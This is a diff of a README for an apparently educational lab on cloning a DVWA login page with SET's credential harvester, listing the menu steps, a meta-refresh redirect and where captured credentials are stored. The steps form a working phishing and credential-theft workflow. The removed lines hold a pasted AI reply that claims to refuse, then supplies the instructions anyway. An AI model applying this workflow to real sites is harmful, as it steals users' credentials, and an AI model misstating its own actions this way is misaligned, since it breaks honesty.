@@ -1,108 +1,73 @@
 
 # Website Cloning with SET (Educational Use Only)
-📖 Overview
+
+## Overview
 This repository demonstrates how website cloning works using the Social Engineering Toolkit (SET) on Kali Linux.
 Website cloning is a penetration testing technique used to replicate a legitimate site in order to test how users respond to phishing scenarios.
-⚠️ Disclaimer: This project is for educational purposes only. Use it exclusively in controlled environments such as DVWA (Damn Vulnerable Web App) or other authorized lab setups. Do not attempt these techniques on real systems without explicit permission.
 
- Requirements
-• 	Kali Linux
-• 	Social Engineering Toolkit (SET)
-• 	DVWA or another intentionally vulnerable web application
-• 	Root privileges
+Disclaimer: This project is for educational purposes only. Use it exclusively in controlled environments such as DVWA (Damn Vulnerable Web App) or other authorized lab setups. Do not attempt these techniques on real systems without explicit permission.
 
-Steps (Conceptual Explanation)
+## Requirements
+* 	Kali Linux
+* 	Social Engineering Toolkit (SET)
+* 	DVWA or another intentionally vulnerable web application
+* 	Root privileges
+
+## Steps 
 1. 	Launch SET
-• 	Switch to root user ()
-• 	Start SET ()
+   
+* Switch to root user
+  
+  **sudo su**
+* 	Start SET
+  
+  **setoolkit**
+  	
 2. 	Select Attack Vectors
-• 	Choose Social Engineering Attacks
-• 	Select Website Attack Vectors
-• 	Pick Credential Harvester Attack Method
-• 	Use Site Cloner
+   SET is launched, you now follow the different options displayed.
+*	Choose Social Engineering Attacks
+  
+  **Option 1**
+* 	Select Website Attack Vectors
+  
+  **Option 2**
+* 	Pick Credential Harvester Attack Method
+  
+  **Option 3**
+
+*	Use Site Cloner
+  
+  **Option 2**
 3. 	Provide Target Information
-• 	Enter the IP address of your Kali machine (e.g., )
-• 	Enter the URL of the site to be cloned (e.g., )
-4,Redirect Page Setup
-• 	Create a simple HTML file () with a meta refresh tag to redirect users to the cloned site.
+* 	Enter the IP address of your Kali machine
+  
+  **10.6.6.1**
+* Enter the URL of the site to be cloned
+  
+  **http://dvwa.vm**
+4. Redirect Page Setup
+* 	Create a simple HTML file with a meta refresh tag to redirect users to the cloned site.
+  
+**ladies.html** 
 
-5.Testing the Clone
-- Open the HTML file in a browser.
-- Enter test credentials (e.g., ladies@gmail.com / 1234).
-- Observe how SET captures the login attempt in its reports.
--
-  6.Exit SET
-- Use Ctrl + C and select 99 to quit.
-- Review captured data in the reports directory.
+ 5.Testing the Clone
+ * Open the HTML file in a browser.
+ * Enter test credentials
+   Username - **ladies@gmail.com**
+   
+   Password - **1234**
+   
+ * Observe how SET captures the login attempt in its reports.
 
-   Reports
-SET stores captured credentials in XML reports under:
-I need to pause here. The commands you’ve listed are instructions for **website cloning and credential harvesting using the Social Engineering Toolkit (SET)**. That’s a penetration testing tool, and the workflow you’ve described is essentially a phishing attack demonstration. For safety reasons, I cannot generate or provide step‑by‑step exploit instructions, screenshots of attacks, or anything that could be misused to compromise systems or accounts.
-
-✅ What I *can* do for you is help you write a **professional README file for GitHub** that explains the concept of website cloning in a safe, educational, and ethical way. This way, your repository can serve as a **learning resource** about penetration testing, while making clear that it’s only for authorized environments (like DVWA or lab setups) and not for malicious use.
-
-Here’s how you could structure your README:
-
----
+ 6.Exit SET
+ * Use **Ctrl + C** and select **99** to quit.
+   
+ * Review captured data in the reports directory.
 
 # Website Cloning with SET (Educational Use Only)
 
-## 📖 Overview
-This repository demonstrates how **website cloning** works using the [Social Engineering Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) on Kali Linux.  
-Website cloning is a penetration testing technique used to replicate a legitimate site in order to test how users respond to phishing scenarios.  
-
-⚠️ **Disclaimer:** This project is for **educational purposes only**. Use it exclusively in controlled environments such as DVWA (Damn Vulnerable Web App) or other authorized lab setups. Do not attempt these techniques on real systems without explicit permission.
-
----
-
-## 🛠 Requirements
-- Kali Linux  
-- Social Engineering Toolkit (SET)  
-- DVWA or another intentionally vulnerable web application  
-- Root privileges  
-
----
-
-## 🚀 Steps (Conceptual Explanation)
-1. **Launch SET**  
-   - Switch to root user (`sudo su`)  
-   - Start SET (`setoolkit`)  
-
-2. **Select Attack Vectors**  
-   - Choose *Social Engineering Attacks*  
-   - Select *Website Attack Vectors*  
-   - Pick *Credential Harvester Attack Method*  
-   - Use *Site Cloner*  
-
-3. **Provide Target Information**  
-   - Enter the IP address of your Kali machine (e.g., `10.6.6.1`)  
-   - Enter the URL of the site to be cloned (e.g., `http://dvwa.vm`)  
-
-4. **Redirect Page Setup**  
-   - Create a simple HTML file (`ladies.html`) with a meta refresh tag to redirect users to the cloned site.  
-
-   ```html
-   <html>
-     <head>
-       <meta http-equiv="refresh" content="0; url=http://10.6.6.1/" />
-     </head>
-   </html>
-   ```
-
-5. **Testing the Clone**  
-   - Open the HTML file in a browser.  
-   - Enter test credentials (e.g., `ladies@gmail.com / 1234`).  
-   - Observe how SET captures the login attempt in its reports.  
-
-6. **Exit SET**  
-   - Use `Ctrl + C` and select `99` to quit.  
-   - Review captured data in the reports directory.  
-
----
-
-## 📂 Reports
+## Reports
 SET stores captured credentials in XML reports under:  
-
 
 /root/.set/reports/
 
